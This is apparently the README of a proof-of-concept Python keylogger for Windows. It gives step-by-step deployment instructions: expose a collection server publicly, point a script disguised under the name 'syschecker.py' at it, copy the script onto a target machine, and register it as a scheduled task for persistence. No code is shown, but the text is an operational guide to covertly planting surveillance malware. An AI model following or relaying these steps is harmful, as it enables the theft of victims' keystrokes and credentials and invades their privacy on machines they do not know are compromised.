# WINDOWS KEYLOGGER IN PYTHON

This directory contains a simple POC of a python keylogger for windows.  

## Instructions  
- Install requirements on the target windows system
- launch the `server/server.py` and expose it publicly
- Modify the endpoint in `syschecker.py`
- Copy `syschecker.py` on the target windows system and launch it with `python syschecker.py` (set this as a scheduled task for persistence).